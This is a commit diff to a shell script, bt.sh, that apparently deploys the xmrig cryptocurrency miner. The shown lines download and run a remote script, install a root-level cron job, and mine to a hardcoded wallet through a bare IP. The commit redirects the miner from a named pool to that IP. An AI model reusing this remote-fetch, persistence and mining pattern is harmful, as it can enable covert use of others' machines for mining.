950a57b3101546d1b8f5278e2bf57e9e6d1591e7
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2021-10-10 09:48:23 +0700

    Update bt.sh

--- bt.sh
+++ bt.sh
@@ -29,4 +29,4 @@ wget https://github.com/robertreynolds2/bteteteh/raw/main/reboot.sh
 chmod +x reboot.sh
 echo "0 0 * * * /home/lufiaq/xmrig/build/reboot.sh" > /etc/cron.d/reboot_24 >/dev/null 2>&1
 clear
-./xmrig --av 7 --safe --max-cpu-usage 85 --cpu-priority 5 -o rx.unmineable.com:3333 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aqunmineable
+./xmrig --av 7 --safe --max-cpu-usage 85 --cpu-priority 5 -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq
